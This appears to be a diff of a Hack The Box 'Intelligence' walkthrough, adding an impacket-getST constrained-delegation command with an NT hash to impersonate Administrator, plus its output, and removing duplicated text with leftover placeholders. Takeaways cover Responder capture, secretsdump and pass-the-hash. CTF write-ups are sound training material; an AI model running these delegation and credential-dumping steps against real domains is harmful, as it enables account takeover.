@@ -1343,7 +1343,18 @@ Our first pivot from `Ted.Graves` will be into the `SVC_INT$` service account. S
 Next, we can use this hash to performed a Constrained Delegation attack on the target DC. This will allow us to impersonate any valid user on the DC including the `Administrator` user and steal their Kerberos Service Ticket.
 
 ```zsh
-└─$ faketime '21:59' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :4de450f51af61cf1e67e982965aca00c 'intelligence.htb/SVC_INT
+└─$ faketime '21:59' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :4de450f51af61cf1e67e982965aca00c 'intelligence.htb/SVC_INT$'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
+[*] Saving ticket in Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+
+```
 After adjusting for clock skew, we successfully get the ST for the `Administrator` user saved to a kerberos cached credential.
 
 ```zsh
@@ -1393,33 +1404,6 @@ smb: \Administrator\Desktop\> dir
 		3770367 blocks of size 4096. 1458538 blocks available
 smb: \Administrator\Desktop\>
 ```
-With the NT hash for `Administrator` we successfully authenticate via SMB and find `root.txt` sitting on their desktop. pwned.
-## Final Thoughts
->[!Takeaways]
->- When fuzzing be sure to really check the naming convention of the items you are fuzzing, or you may miss valuable data.
->- When a PowerShell script passes the `-UseDefaultCredentials` flag for a scheduled task. it's likely we can listen for that auth handshake with Responder.
->- When targeting a custom script that makes a web request on a Windows target. Use `dnstool` to add a record so that your Responder session can catch the callback.
->- When you get a ccache go for `secretsdump`. If it gives you errors, read them and try it's suggested fixes. (i.e. `-just-dc-user`). 
->- You can use `smbclient` to pass-the-hash with the `--pw-nt-hash` flag.
-
-
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] CCache file is not found. Skipping...
-[*] Getting TGT for user
-[*] Impersonating Administrator
-[*] Requesting S4U2self
-[*] Requesting S4U2Proxy
-[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
-[*] Saving ticket in Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-
-```
-After adjusting for clock skew, we successfully get the ST for the `Administrator` user saved to a kerberos cached credential.
-
-{{CODE_BLOCK_20}}
-We then can use our newly minted Kerberos Cached Cred for `Administrator` with `secretsdump` to dump the hashes for Administrator.
-
-{{CODE_BLOCK_21}}
 With the NT hash for `Administrator` we successfully authenticate via SMB and find `root.txt` sitting on their desktop. pwned.
 ## Final Thoughts
 >[!Takeaways]
